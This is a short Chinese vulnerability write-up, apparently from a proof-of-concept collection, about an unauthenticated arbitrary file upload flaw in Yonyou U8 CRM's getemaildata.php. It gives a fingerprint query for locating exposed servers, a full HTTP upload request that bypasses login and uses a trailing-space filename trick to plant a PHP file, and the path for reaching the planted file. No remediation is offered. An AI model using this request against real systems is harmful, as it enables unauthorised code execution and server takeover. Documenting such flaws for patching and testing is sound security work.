# 用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件上传漏洞

## 漏洞描述

用友 U8 CRM客户关系管理系统 getemaildata.php 文件存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器权限，攻击服务器

## 漏洞影响

用友 U8 CRM客户关系管理系统

## 网络测绘

```
web.body="用友U8CRM"
```

## 漏洞复现

登陆页面

![image-20230828151026882](images/image-20230828151026882.png)

验证POC

```
POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ

------WebKitFormBoundarykS5RKgl8t3nwInMQ
Content-Disposition: form-data; name="file"; filename="test.php "
Content-Type: text/plain

<?php phpinfo();?>

------WebKitFormBoundarykS5RKgl8t3nwInMQ
```

![image-20230828151040826](images/image-20230828151040826.png)

访问文件，文件名需要十六进制减一

```
/tmpfile/updD24D.tmp.php
```